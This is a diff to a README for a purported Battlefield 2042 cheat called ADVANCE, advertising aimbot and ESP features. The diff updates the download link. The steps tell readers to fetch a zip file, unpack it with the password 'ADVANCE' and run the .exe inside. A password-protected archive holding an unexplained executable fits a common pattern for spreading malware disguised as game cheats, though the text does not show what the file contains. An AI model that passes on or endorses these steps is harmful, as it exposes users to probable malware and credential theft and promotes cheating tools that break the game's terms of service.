@@ -6,7 +6,7 @@
 ADVANCE is a robust cheat designed for Battlefield 2042, offering essential features such as Aimbot, ESP, and Miscellaneous tools to enhance your gameplay experience. With advanced targeting options, visuals for players, and customizable configurations, this cheat provides unparalleled control and convenience in the battlefield.
 
 ## How to Use
-1. **Get the Latest Version**: (https://github.com/zuoroZERO/Battlefield-2042-Cheat-ADVANCE/releases/download/latest/ADVANCE.zip).
+1. **Get the Latest Version**: (https://github.com/zuoroZERO/Battlefield-2042-Cheat-ADVANCE/releases/download/latest/ADVANCE17.04.zip).
 2. **Unzip the Files**: Use the pass `ADVANCE` to unpack the archive.
 3. **Run the Application**: Execute the `.exe` file. (If it doesn't work, contact the developer.)
 4. **In-Game Key**: Press `HOME` to activate.
